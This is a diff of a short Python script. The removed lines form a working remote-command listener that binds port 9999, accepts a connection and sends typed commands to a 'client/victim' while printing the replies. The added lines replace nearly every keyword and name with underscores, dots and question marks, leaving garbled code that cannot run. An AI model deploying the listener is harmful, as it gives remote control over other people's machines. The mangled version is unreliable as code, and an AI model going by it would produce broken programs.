@@ -1,63 +1,63 @@
-import socket
-import sys
+______ so..
+______ ___
 
 
 # Create a Socket ( connect two computers)
-def create_socket():
-    try:
-        global host
-        global port
-        global s
-        host = ""
-        port = 9999
-        s = socket.socket()
+___ create_socket
+    ___
+        g.. host
+        g.. port
+        g.. s
+        host _ ""
+        port _ 9999
+        s _ ?.?
 
-    except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+    ______ ?.error __ msg:
+        print("Socket creation error: " + st.(msg))
 
 
 # Binding the socket and listening for connections
-def bind_socket():
-    try:
-        global host
-        global port
-        global s
-        print("Binding the Port: " + str(port))
+___ b.._socket
+    ___
+        g.. host
+        g.. port
+        g.. s
+        print("Binding the Port: " + st.(port))
 
-        s.bind((host, port))
-        s.listen(5)
+        s.b..((host, port))
+        s.l..(5)
 
-    except socket.error as msg:
-        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
-        bind_socket()
+    ______ ?.error __ msg:
+        print("Socket Binding error" + st.(msg) + "\n" + "Retrying...")
+        b.._socket
 
 
 # Establish connection with a client (socket must be listening)
 
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
-    send_commands(conn)
-    conn.close()
+___ socket_a..:
+    conn, address _ s.a..
+    print("Connection has been established! |" + " IP " + address[0] + " | Port" + st.(address[1]))
+    s.._commands(conn)
+    conn.c..
 
 # Send commands to client/victim or a friend
-def send_commands(conn):
-    while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024),"utf-8")
-            print(client_response, end="")
+___ s.._commands(conn
+    w__ T..:
+        cmd _ in__
+        __ cmd __ 'quit':
+            conn.c..
+            s.c..
+            ___.e..
+        __ le.(st..en..(cmd)) > 0:
+            conn.s..(st..en..(cmd))
+            client_response _ st.(conn.r..(1024),"utf-8")
+            print(client_response, end_"")
 
 
-def main():
-    create_socket()
-    bind_socket()
-    socket_accept()
+___ main
+    create_socket
+    b.._socket
+    socket_a..
 
 
-main()
+main
